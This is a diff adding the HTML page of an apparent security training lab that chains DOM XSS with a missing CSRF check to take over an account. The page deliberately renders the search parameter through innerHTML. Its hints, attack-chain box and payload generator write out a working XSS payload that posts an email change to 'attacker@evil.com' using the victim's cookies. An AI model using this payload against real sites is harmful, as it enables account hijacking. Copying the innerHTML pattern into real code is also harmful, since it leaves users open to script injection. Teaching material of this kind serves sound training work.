@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: DOM XSS + CSRF = Account Takeover - Chain Level 2</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">Chain #2: DOM XSS + CSRF = ATO</span>
+      <span class="difficulty hard">Hard</span>
+    </div>
+  </div>
+
+  <div id="solve-banner" class="solve-banner"></div>
+
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>Chain a DOM XSS vulnerability with CSRF to achieve account takeover. The search page has DOM XSS via innerHTML, and the email change endpoint has no CSRF token. Craft a URL that, when clicked by a logged-in victim, changes their email to yours.</p>
+      </div>
+
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: The DOM XSS</button>
+        <div class="hint-content">The search page reflects the <code>?q=</code> parameter via innerHTML. You can inject HTML and JavaScript. But you need the XSS to DO something useful — not just pop an alert.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: The CSRF target</button>
+        <div class="hint-content"><code>POST /api/user/change-email</code> takes <code>{"email":"..."}</code> and uses cookie auth with no CSRF token. If you can make the victim's browser send this request, you change their email.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: The XSS payload that chains to ATO</button>
+        <div class="hint-content">Craft a search URL with an XSS payload that calls fetch() to change the email:<br>
+          <code>?q=&lt;img src=x onerror="fetch('/api/user/change-email',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({email:'attacker@evil.com'})})"&gt;</code>
+        </div>
+      </div>
+
+      <h3>Attack Chain</h3>
+      <div class="source-code">
+<pre><span class="comment">// 1. DOM XSS on search page</span>
+<span class="comment">//    ?q=&lt;img src=x onerror=PAYLOAD&gt;</span>
+
+<span class="comment">// 2. PAYLOAD = fetch to change email</span>
+<span class="function">fetch</span>('/api/user/change-email', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  credentials: <span class="string">'include'</span>,
+  body: JSON.<span class="function">stringify</span>({
+    email: <span class="string">'attacker@evil.com'</span>
+  })
+});
+
+<span class="comment">// 3. Victim clicks link → email changed → ATO</span>
+</pre>
+      </div>
+    </div>
+
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+
+        <!-- Login -->
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128274; Login as Victim</h2>
+          <div style="display:flex;gap:8px;align-items:end">
+            <div style="flex:1">
+              <label>Username</label>
+              <input type="text" id="loginUser" value="victim" style="margin-bottom:0">
+            </div>
+            <div style="flex:1">
+              <label>Password</label>
+              <input type="password" id="loginPass" value="password123" style="margin-bottom:0">
+            </div>
+            <button class="btn btn-primary" onclick="doLogin()">Login</button>
+          </div>
+          <div id="login-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <!-- Vulnerable Search -->
+        <div class="lab-form" style="margin-top:16px">
+          <h2 style="margin-bottom:16px">&#128269; Search (DOM XSS here)</h2>
+          <div style="display:flex;gap:8px">
+            <input type="text" id="searchInput" placeholder="Search..." style="margin-bottom:0">
+            <button class="btn btn-primary" onclick="doSearch()">Search</button>
+          </div>
+          <div id="search-results" class="vuln-output" style="margin-top:12px;min-height:40px">
+            <p style="color:var(--text-muted)">Enter a search query...</p>
+          </div>
+        </div>
+
+        <!-- Current Account Status -->
+        <div class="lab-form" style="margin-top:16px">
+          <h2 style="margin-bottom:16px">&#128100; Account Status</h2>
+          <div id="account-info" style="font-size:14px">
+            <p style="color:var(--text-muted)">Login to see account info...</p>
+          </div>
+          <button class="btn btn-secondary" onclick="checkAccount()" style="margin-top:8px">Refresh Account Info</button>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <!-- Attack Craft Section -->
+        <div class="lab-form" style="border:1px solid var(--danger);background:rgba(239,68,68,0.05)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Craft ATO Payload</h2>
+          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px">Build a malicious search URL that chains DOM XSS → email change → ATO.</p>
+
+          <label>Attacker's email</label>
+          <input type="text" id="attackerEmail" value="attacker@evil.com">
+
+          <label>Generated XSS+CSRF URL:</label>
+          <textarea id="maliciousUrl" rows="4" readonly style="font-family:monospace;font-size:11px;background:#0d1117"></textarea>
+
+          <div style="display:flex;gap:8px;margin-top:8px">
+            <button class="btn btn-danger" onclick="generatePayload()">Generate Payload URL</button>
+            <button class="btn btn-danger" onclick="executePayload()">Execute (simulate victim click)</button>
+          </div>
+          <div id="attack-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console">
+            <div class="title">CSRF Actions Log</div>
+            <div id="csrf-log"><div class="log" style="color:var(--text-muted)">No actions yet</div></div>
+          </div>
+          <button class="btn btn-secondary" onclick="refreshLog()" style="margin-top:8px">Refresh</button>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border-radius:8px">
+          <p style="font-size:13px;color:var(--text-muted)">
+            <strong>Real-world impact:</strong> DOM XSS + CSRF email change = Account Takeover. This is a HIGH/CRITICAL severity chain because:
+          </p>
+          <ol style="font-size:13px;color:var(--text-muted);margin-top:8px;padding-left:20px">
+            <li>Victim clicks a single malicious link</li>
+            <li>DOM XSS executes JavaScript in the victim's session</li>
+            <li>The JS makes an authenticated request to change the victim's email</li>
+            <li>Attacker requests a password reset to the new email</li>
+            <li>Full account takeover with one click</li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    // Don't use standard XSS verification - we verify via email change
+    var params = new URLSearchParams(location.search);
+    var q = params.get('q') || '';
+
+    if (q) {
+      document.getElementById('searchInput').value = q;
+      // VULNERABLE: innerHTML with search parameter
+      document.getElementById('search-results').innerHTML =
+        '<div>Results for: <strong>' + q + '</strong></div>' +
+        '<div style="color:var(--text-muted);margin-top:8px">No matching results found.</div>';
+    }
+
+    function doSearch() {
+      var query = document.getElementById('searchInput').value;
+      location.search = '?q=' + encodeURIComponent(query);
+    }
+
+    function doLogin() {
+      fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({
+          username: document.getElementById('loginUser').value,
+          password: document.getElementById('loginPass').value
+        })
+      })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById('login-status').innerHTML = data.success ?
+          '<span style="color:var(--success)">Logged in as ' + data.user.username + ' (' + data.user.email + ')</span>' :
+          '<span style="color:var(--danger)">Failed</span>';
+        if (data.success) checkAccount();
+      });
+    }
+
+    function checkAccount() {
+      fetch('/api/auth/me', { credentials: 'include' })
+        .then(r => r.json())
+        .then(data => {
+          if (data.user) {
+            document.getElementById('account-info').innerHTML =
+              '<div><strong>Username:</strong> ' + data.user.username + '</div>' +
+              '<div><strong>Email:</strong> <span id="current-email">' + data.user.email + '</span></div>' +
+              '<div><strong>Role:</strong> ' + data.user.role + '</div>';
+
+            if (data.user.email === 'attacker@evil.com') {
+              document.getElementById('account-info').innerHTML +=
+                '<div style="color:var(--danger);font-weight:bold;margin-top:8px">EMAIL CHANGED TO ATTACKER! ATO ACHIEVED!</div>';
+              solveLab('chain-2');
+            }
+          }
+        }).catch(() => {});
+    }
+
+    function generatePayload() {
+      var email = document.getElementById('attackerEmail').value;
+      var payload = `<img src=x onerror="fetch('/api/user/change-email',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({email:'${email}'})}).then(()=>document.getElementById('search-results').innerHTML='<div style=color:red>EMAIL CHANGED TO ${email}!</div>')">`;
+      var url = location.origin + location.pathname + '?q=' + encodeURIComponent(payload);
+      document.getElementById('maliciousUrl').value = url;
+    }
+
+    function executePayload() {
+      var url = document.getElementById('maliciousUrl').value;
+      if (!url) { generatePayload(); url = document.getElementById('maliciousUrl').value; }
+      var q = new URL(url).searchParams.get('q');
+      if (q) {
+        document.getElementById('search-results').innerHTML =
+          '<div>Results for: <strong>' + q + '</strong></div>';
+        document.getElementById('attack-status').innerHTML =
+          '<span style="color:var(--warning)">Payload executed! Check account info...</span>';
+        setTimeout(checkAccount, 1000);
+        setTimeout(refreshLog, 1500);
+      }
+    }
+
+    function refreshLog() {
+      fetch('/api/csrf-log').then(r => r.json()).then(actions => {
+        var el = document.getElementById('csrf-log');
+        el.innerHTML = actions.length === 0 ?
+          '<div class="log" style="color:var(--text-muted)">No actions</div>' :
+          actions.map(a => '<div class="log" style="color:' +
+            (a.action === 'email_change' ? 'var(--danger)' : 'var(--text-secondary)') +
+            '">[' + a.action + '] ' + a.user + (a.newEmail ? ' → ' + a.newEmail : '') + '</div>'
+          ).join('');
+      });
+    }
+
+    // Auto-check login
+    fetch('/api/auth/me', { credentials: 'include' })
+      .then(r => r.json())
+      .then(data => {
+        if (data.user) {
+          document.getElementById('login-status').innerHTML =
+            '<span style="color:var(--success)">Logged in as ' + data.user.username + '</span>';
+          checkAccount();
+        }
+      }).catch(() => {});
+  </script>
+</body>
+</html>
